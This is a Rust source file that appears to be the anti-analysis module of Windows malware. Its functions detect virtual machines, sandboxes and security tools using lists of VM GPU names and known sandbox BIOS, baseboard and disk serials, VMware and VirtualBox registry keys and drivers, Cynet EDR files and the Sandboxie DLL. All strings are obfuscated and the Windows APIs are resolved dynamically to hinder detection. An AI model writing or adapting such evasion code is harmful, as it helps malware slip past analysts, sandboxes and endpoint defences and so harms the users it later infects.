use std::env;
use std::process::Command;
use std::ptr;
use rayon::prelude::IntoParallelRefIterator;
use rayon::iter::ParallelIterator;
use winreg::RegValue;
use winreg::{enums::HKEY_LOCAL_MACHINE, RegKey};
use goldberg::goldberg_stmts;
use obfstr::obfstr as obf;
use std::ffi::CStr;

use global::loader;

// Calling Var and Structs
use winapi::shared::minwindef::{HMODULE, BOOL, DWORD, HKEY, LPDWORD, LPBYTE, PHKEY, HKEY__};
use winapi::um::winnt::LPCSTR;
use winapi::um::wingdi::DISPLAY_DEVICEA;

use crate::global;


fn get_gpu_list() -> Vec<String> {
    goldberg_stmts! {
        vec![
            String::from(obf!("29__HERE")),
            String::from(obf!("2RO_8UVU")),
            String::from(obf!("5KBK41_L")),
            String::from(obf!("5LXPA8ES")),
            String::from(obf!("5PECN6L1")),
            String::from(obf!("5RPFT3HZ")),
            String::from(obf!("6BOS4O7U")),
            String::from(obf!("6BZP2Y2_")),
            String::from(obf!("7229H9G9")),
            String::from(obf!("7TB9G6P7")),
            String::from(obf!("84KD1KSK")),
            String::from(obf!("8NYGK3FL")),
            String::from(obf!("8Y3BSXKG")),
            String::from(obf!("9SF72FG7")),
            String::from(obf!("9Z77DN4T")),
            String::from(obf!("AMD Radeon HD 8650G")),
            String::from(obf!("ASPEED Graphics Family(WDDM)")),
            String::from(obf!("BDMD4C14")),
            String::from(obf!("CSUZOOXW")),
            String::from(obf!("CWTM14GS")),
            String::from(obf!("D6XUO1XB")),
            String::from(obf!("DE92L2UN")),
            String::from(obf!("DFXWTBCX")),
            String::from(obf!("ET1BXXAK")),
            String::from(obf!("F1K792VR")),
            String::from(obf!("H1_SDVLF")),
            String::from(obf!("HKWURZU9")),
            String::from(obf!("HP8WD3MX")),
            String::from(obf!("H_EDEUEK")),
            String::from(obf!("Intel(R) HD Graphics 4600")),
            String::from(obf!("K9SC88UK")),
            String::from(obf!("KBBFOHZN")),
            String::from(obf!("KOD68ZH1")),
            String::from(obf!("KW5PTYKC")),
            String::from(obf!("LD8LLLOD")),
            String::from(obf!("M5RGU9RY")),
            String::from(obf!("MDF5Z6ZO")),
            String::from(obf!("Microsoft Basic Display Adapter")),
            String::from(obf!("Microsoft Hyper-V Video")),
            String::from(obf!("Microsoft Remote Display Adapter")),
            String::from(obf!("MKVW6M6X")),
            String::from(obf!("MTSUP2DX")),
            String::from(obf!("MYNP2R7E")),
            String::from(obf!("NVIDIA GeForce 840M")),
            String::from(obf!("NVIDIA GeForce 9400M")),
            String::from(obf!("NVIDIA GeForce 9500 GT (Microsoft Corporation - WDDM v1.1)")),
            String::from(obf!("O597EOTS")),
            String::from(obf!("OEFUG1_W")),
            String::from(obf!("OOUT3ENP")),
            String::from(obf!("OYVM_U6G")),
            String::from(obf!("P9T_AU3X")),
            String::from(obf!("PC1ESCG3")),
            String::from(obf!("R69XK_H3")),
            String::from(obf!("Radeon (TM) RX 580 Graphics")),
            String::from(obf!("Standard VGA Graphics Adapter")),
            String::from(obf!("UKBEHH_S")),
            String::from(obf!("Virtual Desktop Monitor")),
            String::from(obf!("VirtualBox Graphics Adapter")),
            String::from(obf!("VirtualBox Graphics Adapter (WDDM)")),
            String::from(obf!("VMware SVGA 3D")),
            String::from(obf!("VO5V631D")),
            String::from(obf!("W1TO6L3T")),
            String::from(obf!("W29FK1O1")),
            String::from(obf!("X4R9RZ5L")),
            String::from(obf!("XMX85CAL")),
            String::from(obf!("YANBV9OY")),
            String::from(obf!("YNVLCUKZ")),
            String::from(obf!("YVK4794D")),
            String::from(obf!("Z2P8CT__")),
            String::from(obf!("ZN_TF2UZ")),
            String::from(obf!("ZP62XCAP")),
            String::from(obf!("_G31E46N")),
            String::from(obf!("_PHLNYGR")),
            String::from(obf!("_T9W5LHO")),
            String::from(obf!("Стандартный VGA графический адаптер")),
            String::from(obf!("6F44ADR7")),
            String::from(obf!("VM64TTFX")),
            String::from(obf!("WKMZ6LN2")),
            String::from(obf!("2SN538K4")),
            String::from(obf!("2G6C7Z61")),
            String::from(obf!("S6DZU3GA")),
            String::from(obf!("74ZZCY7A")),
            String::from(obf!("HASZN_3F")),
            String::from(obf!("X5ZW15TV")),
            String::from(obf!("HV61HV5F")),
            String::from(obf!("TTXRONXD")),
            String::from(obf!("AFRBR6TC")),
        ]
    }
}

fn get_bios_guid() -> Vec<String> {
    goldberg_stmts! {
        vec![
            String::from(obf!("1111-2222-3333-4444-5555-6666-77")),
            String::from(obf!("23N3POYYY1")),
            String::from(obf!("3198-9985-5799-7712-2227-9299-33")),
            String::from(obf!("91o2Vzn")),
            String::from(obf!("BVE12AKCEN")),
            String::from(obf!("G8RSDBDNAE")),
            String::from(obf!("H8EDC23SF3")),
            String::from(obf!("nebwazhere-33461537510662145672765213630")),
            String::from(obf!("S215027X9C26307")),
            String::from(obf!("XT6AC1LSV7")),
            String::from(obf!("F2050F0")),
            String::from(obf!("A1B7R1ZEOG")),
            String::from(obf!("QQQ978886578")),
            String::from(obf!("S215027X9C26348")),
            String::from(obf!("YYSTYVFWKS")),
            String::from(obf!("C4TV6M26H9")),
            String::from(obf!("S215027X9C26320")),
            String::from(obf!("ASTIBZI")),
            String::from(obf!("O58YKASVDF")),
            String::from(obf!("4HPAOU8EFS")),
            String::from(obf!("7Z7YWZGY1O")),
            String::from(obf!("S215027X0421568")),
            String::from(obf!("GWSESTVRYZ")),
            String::from(obf!("8966-6471-0414-5159-3855-4982-24")),
            String::from(obf!("XAXOXCE8BK")),
            String::from(obf!("9O2WNWVP6M")),
            String::from(obf!("9QJZLY49")),
            String::from(obf!("2HZW8GMKZX")),
            String::from(obf!("5YLKP33LS6")),
            String::from(obf!("FR2PNHNUM9")),
            String::from(obf!("4BWNP53ZYP")),
            String::from(obf!("MF6CZOFL")),
        ]
    }
}

fn get_baseboard_guid() -> Vec<String> {
    goldberg_stmts! {
        vec![
            String::from(obf!("0936857067238931")),
            String::from(obf!("1111-2222-3333-4444-5555-6666-77")),
            String::from(obf!("1982146386385341")),
            String::from(obf!("2747959269666226")),
            String::from(obf!("3198-9985-5799-7712-2227-9299-33")),
            String::from(obf!("6763600828589702")),
            String::from(obf!("7125360206537298")),
            String::from(obf!("nebwazhere-341296874984313456826628")),
            String::from(obf!("ZD192S000813")),
            String::from(obf!("7D4B67276A58480C8")),
            String::from(obf!("6011411254185724")),
            String::from(obf!("QQQQQQQ978886578")),
            String::from(obf!("ZD192S001109")),
            String::from(obf!("4818215228163524")),
            String::from(obf!("3345771688717745")),
            String::from(obf!("5769118809068676")),
            String::from(obf!("1914014226551656")),
            String::from(obf!("7852388990144422")),
            String::from(obf!("WD201S000104")),
            String::from(obf!("ZD192S000915")),
            String::from(obf!("8167610923259059")),
            String::from(obf!("8966-6471-0414-5159-3855-4982-24")),
            String::from(obf!("8679625164016616")),
            String::from(obf!("2068114050712741")),
            String::from(obf!("QILB1AZI1")),
            String::from(obf!("YY1COIU6S6")),
            String::from(obf!("4790421453068944")),
            String::from(obf!("8068495691790338")),
            String::from(obf!("5220475704923916")),
            String::from(obf!("JW8SGQN72")),
        ]
    }
}

fn get_disk_serial() -> Vec<String> {
    goldberg_stmts! {
        vec![
            String::from(obf!("beaf1211")),
            String::from(obf!("beaf2081")),
            String::from(obf!("QM00013")),
            String::from(obf!("VB9b31f9ac-5dd7d509")),
            String::from(obf!("VBb6525b74-1a30b936")),
            String::from(obf!("beaf1351")),
            String::from(obf!("1-0000:00:05.0-1")),
            String::from(obf!("beaf1391")),
            String::from(obf!("beaf1491")),
            String::from(obf!("beaf2071")),
            String::from(obf!("QM00001")),
        ]
    }
}

fn is_vmware_installed() -> bool {

    let vmware_keys: [std::string::String; 2] = [
        String::from(obf!("SOFTWARE\\VMware, Inc.\\VMware Tools")),
        String::from(obf!("SOFTWARE\\VMware, Inc.\\VMware Workstation")),
    ];

    for key_path in &vmware_keys {
        match RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey(key_path) {
            Ok(_) => return true,
            Err(_) => continue,
        }
    }

    false
}

fn check_vm_dll() -> bool {
    let system_root = env::var(obf!("SystemRoot")).unwrap();
    let prog86 = env::var(obf!("ProgramFiles(x86)")).unwrap();
    let progdata = env::var(obf!("ProgramData")).unwrap();
    let vect = vec![
        format!("{}{}", system_root, obf!("\\System32\\vmGuestLib.dll")),
        format!("{}{}", system_root, obf!("\\vboxmrxnp.dll")),
        format!("{}{}", system_root, obf!("\\CynetMS.exe")),
        format!("{}{}", system_root, obf!("\\CynetEPS.exe")),
        format!("{}{}", system_root, obf!("\\CynetNDR.exe")),
        format!("{}{}", prog86, obf!("\\Cynet\\Cynet Scanner\\CynetScanner.exe")),
        format!("{}{}", progdata, obf!("\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\agent.pyw")),
        format!("{}{}", system_root, obf!("\\system32\\drivers\\vmmouse.sys")),
        format!("{}{}", system_root, obf!("\\system32\\drivers\\vmhgfs.sys")),
        format!("{}{}", system_root, obf!("\\System32\\drivers\\VBoxMouse.sys")),
        format!("{}{}", system_root, obf!("\\System32\\drivers\\VBoxGuest.sys")),
        format!("{}{}", system_root, obf!("\\System32\\drivers\\VBoxSF.sys")),
        format!("{}{}", system_root, obf!("\\System32\\drivers\\VBoxVideo.sys")),
        format!("{}{}", system_root, obf!("\\system32\\vboxdisp.dll")),
        format!("{}{}", system_root, obf!("\\system32\\vboxhook.dll")),
        format!("{}{}", system_root, obf!("\\system32\\vboxmrxnp.dll")),
        format!("{}{}", system_root, obf!("\\system32\\vboxogl.dll")),
        format!("{}{}", system_root, obf!("\\system32\\vboxoglarrayspu.dll")),
        format!("{}{}", system_root, obf!("\\system32\\vboxoglcrutil.dll")),
        format!("{}{}", system_root, obf!("\\system32\\vboxoglerrorspu.dll")),
        format!("{}{}", system_root, obf!("\\system32\\vboxoglfeedbackspu.dll")),
        format!("{}{}", system_root, obf!("\\system32\\vboxoglpassthroughspu.dll")),
        format!("{}{}", system_root, obf!("\\system32\\vboxservice.exe")),
        format!("{}{}", system_root, obf!("\\system32\\vboxtray.exe")),
        format!("{}{}", system_root, obf!("\\system32\\VBoxControl.exe")),
        obf!("\\Device\\Harddisk0\\DR0").to_string(),
        obf!("\\Device\\Harddisk0\\DR1").to_string(),
        obf!("\\Device\\Harddisk0\\DR2").to_string(),
        obf!("\\Device\\Harddisk0\\DR3").to_string(),
    ];

    for path in vect {
        if std::fs::metadata(&path).is_ok() {
            return true;
        }
    }

    // Check if Sandboxie DLL exists
    let dll = std::ffi::CString::new(obf!("SbieDll.dll")).unwrap();
    let handle = global::loader::LoadMod::new(obf!("kernel32.dll")).unwrap();
    let get_module_handle = global::loader::call_function!(&handle, fn(LPCSTR) -> HMODULE, obf!("GetModuleHandleA"));
    let load_library = global::loader::call_function!(&handle, fn(LPCSTR) -> HMODULE, obf!("LoadLibraryA"));

    if get_module_handle(ptr::null()).is_null() {
        if !load_library(dll.as_ptr()).is_null() {
            return true;
        }
    }

    false
}

// fn is_hyper_v_enabled() -> bool {
//     let subkey: String = obf!("SYSTEM\\CurrentControlSet\\Control\\DeviceGuard").to_string();
//     let reg_key = RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey(&subkey);

//     match reg_key {
//         Ok(key) => {
//             let value: Result<RegValue, _> = key.get_raw_value(obf!("EnableVirtualizationBasedSecurity"));

//             match value {
//                 Ok(enable_virtualization_based_security) => {
//                     if !enable_virtualization_based_security.bytes.is_empty() && enable_virtualization_based_security.bytes[0] == 1 {
//                         return true;
//                     }
//                 }
//                 Err(_) => return false,
//             }
//         }
//         Err(_) => return false,
//     }

//     false
// }

// Check if the hypervisor bit is set
// fn check_bit_31() -> bool {
//     let result: u32;
//     unsafe {
//         std::arch::asm!(
//             "cpuid",
//             inout("eax") 0x1 => result,
//             lateout("ecx") _,
//             lateout("edx") _,
//         );
//     }
//     (result >> 31) & 1 == 1
// }

fn is_vmware_registry() -> bool {

    if [obf!("D:\\Tools"), obf!("D:\\OS2"), obf!("D:\\NT3X")].par_iter().any(|path| env::set_current_dir(path).is_ok()) {
        return true;
    }

    let subkey: String = String::from(obf!(r"SYSTEM\ControlSet001\Control\Class\{4D36E968-E325-11CE-BFC1-08002BE10318}\0000"));
    let reg1 = RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey(&subkey).unwrap().get_raw_value(obf!("DriverDesc"));
    let reg2 = RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey(&subkey).unwrap().get_raw_value(obf!("ProviderName"));

    match (reg1, reg2) {
        (Ok(driver_desc), Ok(provider_name)) => {
            if let (Ok(driver_desc), Ok(provider_name)) = (String::from_utf16(global::utils::u8_slice_to_u16_slice(driver_desc.bytes.as_slice())), String::from_utf16(global::utils::u8_slice_to_u16_slice(provider_name.bytes.as_slice()))) {
                if !driver_desc.is_empty() && !provider_name.is_empty() {
                    if is_vmware_installed() {
                        return true;
                    }
                }
            }
        },
        _ => {}
    }

    false
}

fn get_base_prefix_compat() -> Option<String> {
    env::var(obf!("base_prefix"))
        .ok()
        .or_else(|| env::var(obf!("real_prefix")).ok())
        .or_else(|| env::var(obf!("prefix")).ok())
}

fn in_virtualenv() -> bool {
    if let Some(base_prefix) = get_base_prefix_compat() {
        return base_prefix != env::var(obf!("prefix")).unwrap_or_default();
    }
    false
}

fn get_display_device_info() -> String {
    let mut display_device: DISPLAY_DEVICEA = unsafe { std::mem::zeroed() };
    display_device.cb = std::mem::size_of::<DISPLAY_DEVICEA>() as u32;
    let device_index: u32 = 0;

    let handle = global::loader::LoadMod::new(obf!("user32.dll")).unwrap();
    let enum_display_devices = global::loader::call_function!(&handle, fn(LPCSTR, DWORD, *mut DISPLAY_DEVICEA, DWORD) -> BOOL, obf!("EnumDisplayDevicesA"));
    if enum_display_devices(std::ptr::null(), device_index, &mut display_device, 0) != 0 {
        // Use CStr to create safe Rust string slices from raw pointers
        // let device_name = unsafe { CStr::from_ptr(display_device.DeviceName.as_ptr()) };
        let device_description = unsafe { CStr::from_ptr(display_device.DeviceString.as_ptr()) };

        // Convert CStr to String
        // let device_name_str = device_name.to_string_lossy().into_owned();
        let device_description_str = device_description.to_string_lossy().into_owned();

        return device_description_str;
    }
    return String::from(obf!("Failed to get display device info"));
}

fn get_bios_manufacturer() -> bool {
    let subkey = String::from(obf!("HARDWARE\\DESCRIPTION\\System\\BIOS"));
    let banned = vec![
        String::from(obf!("VMware")),
        String::from(obf!("VirtualBox")),
        String::from(obf!("Xen"))
    ];

    match RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey(&subkey).unwrap().get_raw_value(obf!("SystemManufacturer")) {
        Ok(val) => {
            let val_str = String::from_utf16(global::utils::u8_slice_to_u16_slice(val.bytes.as_slice())).unwrap();
            for ban in banned {
                if val_str.contains(&ban) {
                    return true;
                }
            }
        },
        Err(_) => {},
    }
    false
}

fn check_compoments() -> bool {
    let gpulist = get_gpu_list();
    let bios_guid = get_bios_guid();
    let baseboard_guid = get_baseboard_guid();
    let serial_disk = get_disk_serial();

    // Check GPU
    let gpun = get_display_device_info();

    for gpu in &gpulist {
        if gpun.contains(gpu.as_str()) {
            return true;
        }
    }
    
    // Check BIOS SerialNumber
    let output = Command::new(obf!("wmic"))
        .args(&[obf!("bios"), obf!("get"), obf!("serialNumber")])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);

    if bios_guid.contains(&stdout.trim().to_owned()) {
        return true;
    }

    // Check BaseBoard SerialNumber
    let output = Command::new(obf!("wmic"))
        .args(&[obf!("baseboard"), obf!("get"), obf!("serialNumber")])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);

    if baseboard_guid.contains(&stdout.trim().to_owned()) {
        return true;
    }

    // Check DiskDrive SerialNumber
    let output = Command::new(obf!("wmic"))
        .args(&[obf!("diskdrive"), obf!("get"), obf!("serialNumber")])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);

    if serial_disk.contains(&stdout.trim().to_owned()) {
        return true;
    }
    false
}

pub fn is_vm_present() -> bool {
    let checks = vec![
        || check_compoments(),
        || get_bios_manufacturer(),
        || is_vmware_registry(),
        || check_vm_dll(),
        || in_virtualenv(),
        // || is_hyper_v_enabled() && check_bit_31(),

    ];

    return if checks.par_iter().any(|check| check()) {true} else {false};
}
